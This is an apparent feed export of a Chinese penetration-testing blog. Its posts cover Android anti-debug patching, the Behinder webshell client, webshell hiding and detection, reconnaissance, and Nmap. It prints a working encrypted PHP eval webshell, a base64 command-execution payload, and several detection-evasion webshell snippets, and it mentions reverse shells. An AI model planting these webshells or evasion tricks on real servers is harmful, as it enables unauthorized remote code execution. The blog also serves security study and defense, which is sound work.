src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-17.png"></p></li><li><p>找到反调试代码处，pthread_create()，（关键地方，可按f5，把汇编代码转成C语言辅助）反复按 <code>F8</code> 单步执行，程序退出处，既为反调）</p></li><li><p>让反调试代码不执行。 让该指令变为空指令，既 NOP，NOP指令的16进制是 <code>00 00 00 00</code>。记住反调试处的汇编指令，同时以静态方式再打开一个IDA，打开so文件，在静态ida里查找到此汇编指令，鼠标选中后面的寄存器，然后切换到 <code>Hex View</code>，会显示该<br>指令的16进制。复制该16进制，再用一文本工具打开目标so文件，找到该16进制处，替换成 <code>00 00 00 00</code> ，既空指令。既不执行反调试代码.</p></li><li><p>保存so文件，再重新打包APP，签名，重新安装APP。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ida动态调试&quot;&gt;&lt;a href=&quot;#ida动态调试&quot; class=&quot;headerlink&quot; title=&quot;ida动态调试&quot;&gt;&lt;/a&gt;ida动态调试&lt;/h2&gt;&lt;p&gt;如果要进行动态调试，首先需要搭建相关环境，我使用的还是阿里的 &lt;code&gt;crackMe.apk&lt;/</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>冰蝎使用</title>
    <link href="http://yejuns.github.io/2021/03/13/%E5%86%B0%E8%9D%8E%E4%BD%BF%E7%94%A8/"/>
    <id>http://yejuns.github.io/2021/03/13/%E5%86%B0%E8%9D%8E%E4%BD%BF%E7%94%A8/</id>
    <published>2021-03-13T02:20:11.000Z</published>
    <updated>2021-07-03T08:17:49.641Z</updated>
    
    <content type="html"><![CDATA[<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><p>“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，最早的webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测。基于流量加密的webshell变得越来越多，”冰蝎”在此应运而生。</p><h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p> 一句话木马是一般是指一段短小精悍的恶意代码，这段代码可以用作一个代理来执行攻击者发送过来的任意指令，比如最常见的<code>eval($_REQUEST[&quot;a&quot;]);</code>。</p><p> 但是随着防御手段的发展，也出现了很多的防御工具。一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测。另一类是是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测。</p><p> 而我们发送Payload被拦截的原因就在于，客户端发送的请求特征太明显，比如菜刀的payload<br> <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caidao=Response.Write(<span class="string">&quot;-&gt;|&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> err:Exception;<span class="keyword">try</span>&#123;eval(System.Text.Encoding.GetEncoding(<span class="number">65001</span>).GetString(System. Convert.FromBase64String(<span class="string">&quot;dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D&quot;</span>)),<span class="string">&quot;unsafe&quot;</span>);&#125;<span class="keyword">catch</span>(err)&#123;Response.Write(<span class="string">&quot;ERROR:// &quot;</span>%2Berr.message);&#125;Response.Write(<span class="string">&quot;|&lt;-&quot;</span>);Response.End();&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%<span class="number">3D</span>%<span class="number">3D</span></span><br></pre></td></tr></table></figure><br>虽然关键的代码采用了base64编码，但是payload中扔有多个明显的特征，比如有eval关键词，有Convert.FromBase64String，有三个参数，参数名为caidao（密码字段）、z1、z2，参数值有base64编码。根据这些特征很容易写出对应的防护规则，比如：POST请求中有Convert.FromBase64String关键字，有z1和z2参数，z1参数值为4个字符，z2参数值为base64编码字符。</p><p>冰蝎就考虑通过动态二进制编码的思路来绕过防火墙，具体流程如下：</p><ol><li>首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器侧的Session中。</li><li>客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。</li><li>服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。</li><li>服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。</li><li>客户端解密服务器端返回的结果。<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-1.png"></li></ol><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>直接在github上下载，<a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11">传送门</a></p><p>下载后直接解压，得到一个jar包，本地有java环境就可以直接运行</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>在自己的php环境中写一个一句话木马，其代码如图所示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span>=substr(md5(uniqid(rand())),<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"><span class="variable">$post</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=explode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">@<span class="keyword">new</span> C(<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用冰蝎连接<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-2.png"></p><p>双击增加的链接显示出phpinfo()即成功！<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-3.png"></p><p>虚拟终端(在windows平台上可以是exec或者powershell)</p><p>反弹shell，这个很有用<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-4.png"></p><p>数据库可视化功能<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/otherBehinder-5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;冰蝎&quot;&gt;&lt;a href=&quot;#冰蝎&quot; class=&quot;headerlink&quot; title=&quot;冰蝎&quot;&gt;&lt;/a&gt;冰蝎&lt;/h2&gt;&lt;p&gt;“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，最早的webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测。基于</summary>
      
    
    
    
    
    <category term="工具" scheme="http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>渗透之域渗透</title>
    <link href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    <id>http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/</id>
    <published>2021-03-12T08:01:51.000Z</published>
    <updated>2021-07-31T15:17:04.336Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-什么是域"><a href="#1-什么是域" class="headerlink" title="1.什么是域"></a>1.什么是域</h2><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，<code>域控制器</code>中保存着整个域的用户帐号和安全数据库。</p><p>(域是一种逻辑结构，是指一个有安全边界的集合，同一个域中的计算机彼此之间建立信任关系，计算机之间允许互相访问)</p><blockquote><p>域控制器（Domain controller，简称DC）是指在计算机网络域内响应安全身份认证请求的网络服务器负责允许发出请求的主机访问域内资源，以及对用户进行身份验证，存储用户账户信息，并执行域的安全策略。</p></blockquote><h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-什么是域&quot;&gt;&lt;a href=&quot;#1-什么是域&quot; class=&quot;headerlink&quot; title=&quot;1.什么是域&quot;&gt;&lt;/a&gt;1.什么是域&lt;/h2&gt;&lt;p&gt;将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透之webshell</title>
    <link href="http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8Bwebshell/"/>
    <id>http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8Bwebshell/</id>
    <published>2021-03-12T08:01:51.000Z</published>
    <updated>2021-08-01T03:39:09.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshell是以asp、jsp、php或cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门</p><blockquote><p>cgi（common gateway interface）：公共网关接口</p></blockquote><p>常用的攻击方式有：直接上传文件、SQL注入、远程文件包含（RFI）、甚至使用XSS作为攻击的一部分。</p><h3 id="如何隐藏-webshell"><a href="#如何隐藏-webshell" class="headerlink" title="如何隐藏 webshell"></a>如何隐藏 webshell</h3><ol><li><p>将指令隐藏在UA，而不是放在$_POST传递命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_SERVER</span>(<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>))&gt;</span><br></pre></td></tr></table></figure><p>这种方式会在服务器日志中留下痕迹，很容易被识别</p></li><li><p>动态函数执行，把一个函数名当成一个字符串传递给一个变量，然后去执行(类似的：把执行命令分别放在一个文件中，然后用另一个文件去包括)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&quot;phpinfo&quot;</span>; <span class="variable">$a</span>()&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用各种编码比如hex、base64等，而且目录层数越深越好，尽量把上传的webshell放到四五级目录下</p></li><li><p>webshell里面尽量不要用类似<code>eval，exec,system,assert</code>这样敏感的特征，因为awk很容易检测出来。可以自己写一些自定义函数，或者使用<code> call_user_func</code>这样的回调函数来构造webshell。</p></li><li><p>在win sever环境下，使用windows中的隐藏文件 — NTFS文件流（ADS）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ~&lt;?php @eval($_POST[&#x27;chaper&#x27;]);?~&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure><p>这样就生成了一个不可见的文件，常规的文件管理器，type命令，dir命令都不能发现这个<code>index.php:hidden.jpg</code>,这个文件只能通过命令<code>notepad index.php:hidden.jpg</code>打开。</p></li></ol><h2 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h2><h3 id="1-基于webshell的特征检测"><a href="#1-基于webshell的特征检测" class="headerlink" title="1.基于webshell的特征检测"></a>1.基于webshell的特征检测</h3><p>常见的webshelll函数</p><ol><li>存在系统调用的命令执行函数，如eval、system、cmd_shell、assert等；</li><li>存在系统调用的文件操作函数，如fopen、fwrite、readdir等</li><li>存在数据库操作函数，调用系统自身的存储过程来连接数据库操作；</li></ol><p>这种基于特征值、危险函数的特征检测只能查找已知的webshell，无法查找0day型的webshell，而且误报率比较高。对于大型的网站，可以使用强弱特征，即把特征分为强弱两种特征，强特征命中则是webshell，弱特征由人工去判断</p><h3 id="2-基于流量特征的webshell检测"><a href="#2-基于流量特征的webshell检测" class="headerlink" title="2.基于流量特征的webshell检测"></a>2.基于流量特征的webshell检测</h3><p>webshell通信是HTTP协议。只要我们把webshell特有的HTTP请求/响应做成特征库，加到 IDS 里面去检测所有的HTTP请求就好。webshell如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。如果黑客反向连接的话，Agent和IDS都可以检测到。Webshell总有一个HTTP请求，如果在网络层监控HTTP，并且检测到有人访问了一个从没反问过的文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。</p><p>比如中国菜刀的流量特征就很明显</p><h3 id="3-日志检测"><a href="#3-日志检测" class="headerlink" title="3. 日志检测"></a>3. 日志检测</h3><p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，这是：HTTP异常请求模型检测。例如：一个平时是GET的请求突然有了POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。</p><p>ebshell的访问特征(主要特征)</p><ol><li>少量ip对其发起访问</li><li>总的访问次数少</li></ol><p>优点：采用了一定数据分析的方式，网站的访问量达到一定量级时这种检测方法的结果具有较大参考价值。</p><p>缺点：存在一定误报，对于大量的访问日志，检测工具的处理能力和效率会比较低。</p><h2 id="webshell防御"><a href="#webshell防御" class="headerlink" title="webshell防御"></a>webshell防御</h2><ol><li>建议用户通过ftp来上传、维护网页，尽量不安装asp，php的上传程序。</li><li>对asp，php上传程序的调用一定要进行身份认证，并只允许信任的人使用上传程序。</li><li>利用白名单上传文件，上传目录权限遵循最小权限原则。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;webshell&quot;&gt;&lt;a href=&quot;#webshell&quot; class=&quot;headerlink&quot; title=&quot;webshell&quot;&gt;&lt;/a&gt;webshell&lt;/h2&gt;&lt;p&gt;webshell是以asp、jsp、php或cgi等网页文件形式存在的一种命令执行环境，也可</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>web安全之信息收集</title>
    <link href="http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-03-11T08:01:51.000Z</published>
    <updated>2021-08-09T12:27:48.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>在web渗透中，信息收集的深度与广度决定了后续渗透测试的成功与否，所以我们需要尽可能的收集目标的所有信息；收集方向大概分为以下几点：</p><ul><li>有无CDN</li><li>有无WAF</li><li>组织信息</li><li>搭建环境</li><li>站点架构</li><li>网站源码获取</li><li>域名信息</li><li>有无APK</li><li>有无微信小程序</li><li>有无PC应用</li><li>自动批量信息收集</li><li>其它信息收集</li></ul><h2 id="2-信息收集思路"><a href="#2-信息收集思路" class="headerlink" title="2. 信息收集思路"></a>2. 信息收集思路</h2><ol><li><p>拿到渗透测试目标后，首先判断目标域名是否存在CDN，如果存在，需要先绕过CDN获取真实IP后再进行下一步，防止后续渗透测试全部测试到CDN节点上。</p><p><a href="https://cloud.tencent.com/developer/article/1634648">如何绕过CDN?</a></p></li><li><p>测试目标是否存在WAF，可以通过工具识别（存在误判）或者通过人工识别（根据拦截页面的图片判断）的方式判断是否存在WAF，什么类型的WAF，然后针对性的进行绕过.</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Nmap有一些脚本可以来测试WAF中是否存在于所有检测到的HTTP端口</span><br><span class="line">nmap -sT -sV-p <span class="number">80</span>,<span class="number">443</span>,<span class="number">8080</span>,<span class="number">8081</span> --script=http-waf-detect <span class="number">192.168</span><span class="number">.56</span><span class="number">.11</span></span><br><span class="line">nmap -p80,<span class="number">443</span> --script=http-waf-fingerprint www.example.com</span><br><span class="line"># SQLMap中自带的WAF识别模块可以识别出WAF的种类，但是如果所安装的WAF并没有什么特征，SQLMap就只能识别出类型是Generic。</span><br><span class="line">sqlmap.py -u “url” –identify-waf  –batch</span><br></pre></td></tr></table></figure></li><li><p>先从组织信息这块入手，获取到网站和管理员的一些信息（QQ,手机号，邮箱等等…），通过whois，网站备案信息获取更多目标；后期需要爆破时可以通过获取到的联系方式针对性的生成字典，提高爆破成功率；也可以利用联系方式在Github等托管平台搜索泄露的敏感信息</p></li><li><p>针对网站搭建环境需要收集目标操作系统是Windows还是Linux?具体内核版本是什么?开放了哪些端口和服务？后续可以针对性的进行测试(例如可以使用公开的缓冲区溢出，RCE，弱口令等安全漏洞进行测试)；收集到目标的中间件版本信息，数据库版本信息后，一样可以寻找相关安全漏洞进行测试(例如中间件解析漏洞,RCE,远程代码执行等等，数据库弱口令,未授权访问等等)。获取的Web接口（短信接口，支付接口等等）也可以作为渗透测试的一个突破口。了解网站使用的脚本语言也很重要，由于各种脚本语言的特性与机制，其产生的安全问题也有很大差异（例如PHP站点中经常出现SQL注入，文本包含等安全问题，而Java站点中则经常出现反序列化的安全漏洞）</p></li><li><p>网站的搭建架构也是不可忽视的部分，很多站点在同一台服务器上经常使用端口，目录，子域名等方式区分站点，所以我们渗透测试时需要对开放端口，网站目录，子域名等信息都要收集（在进行目录扫描时除了对网站域名进行扫描，也建议对网站IP进行扫描；例如某个网站 <a href="http://192.168.1.1/">http://192.168.1.1</a> 站点的根目录是www，其下域名test.com 的根目录是www/test.com 。如果在网站根目录www下存在test.com的源码备份，我们扫描时如果只针对域名进行目录扫描，是无法获取到源码备份的，只有通过对IP站点进行目录扫描才能发现 test.com 的源码备份）。</p></li><li><p>在渗透测试时，能获取到网站源码往往能达到事半功倍的效果。如果我们知道目标站点使用的是CMS搭建，那么我们就可以寻找该CMS公开漏洞进行测试；如果使用的是框架开发，那么也可以搜索该框架漏洞进行测试；或者我们可以利用获取的网站源码进行本地搭建测试寻找安全漏洞，也可以通过代码审计的方式挖掘0day。</p></li><li><p>如何获取网站源码：可以通过扫描网站目录获取源码备份；CMS可以直接去CMS官网下载；框架开发的站点可以去官网下载框架本地安装；某些正规源码（商城，博客，企业等等）可以通过搜索引擎在一些正规源码站获取，违法源码（BC，棋牌，私服，杀猪盘等等）也可以通过搜索引擎在一些黑源码站进行获取；某些站点可能使用了Github，Gitee等托管平台托管，也可能存在源码泄露的安全问题。</p></li><li><p> 针对域名的收集可以通过网站备案，Whois查询获取更多目标（Whois反查注册人，电话，邮箱等等）；通过IP地址反查绑定的域名信息；也可以通过搜索引擎或者在线平台获取目标子域名或利用工具进行子域名枚举；也可以利用空间引擎寻找同模板站点，在同模板站点获取源码后进行代码审计挖掘到漏洞后在转向测试目标；或者通过搜索域名中的关键字（例如 baidu.com 中的baidu，在搜索引擎或域名注册商处查询类似域名 baidu.cn，baidu.net等等)。或者对旁站C段进行信息收集，从旁站或C段入手，间接的拿下目标站点。</p></li><li><p> 假如目标只是一个单纯的APK下载页或PC程序下载页，或者是一个微信公众号，那么我们可以通过对这些APK&amp;微信小程序&amp;PC应用进行抓包或者逆向获取其中的URL和IP地址，转向Web渗透测试的思路。</p></li><li><p>在收集测试目标的Web目录，备份文件等信息时，除了使用Web目录文件扫描，还可以进行Fuzz，尽可能的收集更多信息；而后期在SQL注入，文件上传，XSS等漏洞挖掘或绕Waf时也可以使用Fuzz进行测试。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-信息收集&quot;&gt;&lt;a href=&quot;#1-信息收集&quot; class=&quot;headerlink&quot; title=&quot;1.信息收集&quot;&gt;&lt;/a&gt;1.信息收集&lt;/h2&gt;&lt;p&gt;在web渗透中，信息收集的深度与广度决定了后续渗透测试的成功与否，所以我们需要尽可能的收集目标的所有信息；收</summary>
      
    
    
    
    
    <category term="信息收集" scheme="http://yejuns.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>web安全之Nmap使用</title>
    <link href="http://yejuns.github.io/2021/03/03/NMap%E4%BD%BF%E7%94%A8/"/>
    <id>http://yejuns.github.io/2021/03/03/NMap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-03-03T13:21:21.000Z</published>
    <updated>2021-08-11T09:06:48.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>kali上已经自带，windows上去官网下载相关的安装包，centos就直接 <code>yum install nmap</code></p><h3 id="简单入门"><a href="#简单入门" class="headerlink" title="简单入门"></a>简单入门</h3><p>刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 <code>nmap your-ip（域名）</code> 就可以扫描出其对外开放的服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash">基本格式，会扫描该主机的所有端口</span></span><br><span class="line"></span><br><span class="line">nmap -p 8080 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断指定ip是否开放指定端口</span> </span><br><span class="line"></span><br><span class="line">nmap  -p 22,21,80 192.168.31.13</span><br><span class="line">nmap  -p 22,21,80 192.168.31.1-253</span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加端口和网段</span> </span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1/24</span><br><span class="line"><span class="meta">#</span><span class="bash"> 扫描整个子网的端口，这个过程可能会比较久</span></span><br></pre></td></tr></table></figure><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p>Nmap扫描相关端口后，会显示出各个端口的状态，一共有6种</p><ol><li>Open，开放状态（当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务）</li><li>Closed，关闭状态（TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口）</li><li>Filtered(过滤的)，由于报文无法到达指定的端口，nmap不能确定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致</li><li>Unfiltered(未被过滤的), 虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。</li><li>Open|filtered  Nmap认为指定端口处于开放状态或过滤状态，这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型</li><li>Closed|filtered Nmap认为指定端口处于开放状态或未过滤状态，</li></ol><p>以下是一些例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash">操作系统检测（-O）</span></span><br><span class="line"></span><br><span class="line">nmap  -Pn 80 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁用主机检测（-Pn）,如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机。这将使得Nmap无法进行进一步检测，禁用Nmap的主机检测功能后。Nmap会认为目标主机已经开机并进行全套的检测工作</span></span><br><span class="line"></span><br><span class="line">nmap -A 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强力检测选项（-A），Nmap将检测目标主机的下述信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务版本识别（-sV）；操作系统识别（-O）；脚本扫描（-sC）</span></span><br><span class="line"></span><br><span class="line">nmap -sT 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来</span></span><br><span class="line"></span><br><span class="line">nmap -sS 